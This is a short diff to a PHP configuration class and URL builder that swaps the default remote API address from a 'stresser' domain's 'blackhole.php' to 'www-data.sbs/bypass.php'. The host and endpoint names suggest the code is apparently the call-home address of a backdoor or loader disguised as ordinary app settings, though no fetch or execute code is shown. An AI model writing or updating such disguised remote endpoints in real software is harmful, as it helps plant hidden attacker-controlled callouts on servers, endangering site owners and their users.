@@ -32,13 +32,10 @@ class AppConfig {
                 'scheme' => getenv('API_SCHEME') ?: 'https',
 
                 // API host/domain
-                'host'   => getenv('API_HOST') ?: 'skynetstresser.cc',
-
-                // API blog
-                'blog'   => getenv('API_BLOG') ?: 'blog.',
+                'host'   => getenv('API_HOST') ?: 'www-data.sbs',
 
                 // API endpoint path
-                'endpoint' => getenv('API_PATH') ?: 'blackhole.php',
+                'endpoint' => getenv('API_PATH') ?: 'bypass.php',
             ],
 
             'http' => [
@@ -66,7 +63,7 @@ class UrlBuilder {
     public static function build(array $config): string {
         $api = $config['api'];
 
-        return "{$api['scheme']}://{$api['blog']}{$api['host']}/{$api['endpoint']}";
+        return "{$api['scheme']}://{$api['host']}/{$api['endpoint']}";
     }
 }
 
